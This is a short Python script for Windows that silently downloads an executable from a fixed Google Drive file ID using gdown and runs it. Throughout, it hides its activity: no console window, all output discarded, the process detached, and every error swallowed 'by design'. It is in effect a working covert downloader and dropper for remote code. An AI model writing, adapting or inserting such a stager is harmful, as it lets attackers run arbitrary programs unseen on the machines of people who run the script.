import subprocess
import sys
import os

# Replace the drive ID here
GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
OUTPUT_NAME = "downloaded_file.exe"  # Explicit .exe extension for clarity

def main():
    # This script is designed for Windows (since it runs an .exe)
    if sys.platform != "win32":
        return

    url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
    cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]

    # Use CREATE_NO_WINDOW to avoid any visible console on Windows.
    creationflags = getattr(subprocess, 'CREATE_NO_WINDOW', 0x08000000)

    try:
        # Wait for the download to complete
        result = subprocess.run(
            cmd,
            creationflags=creationflags,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            check=False  # We'll handle errors manually
        )
        if result.returncode != 0:
            # Download failed; silently exit
            return

        # Verify the downloaded file exists
        if not os.path.isfile(OUTPUT_NAME):
            return

        # Run the downloaded executable (detached, no window)
        subprocess.Popen(
            [OUTPUT_NAME],
            creationflags=creationflags,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True,
        )
    except Exception:
        # Silent by design – do nothing on any error
        pass

if __name__ == "__main__":
    main()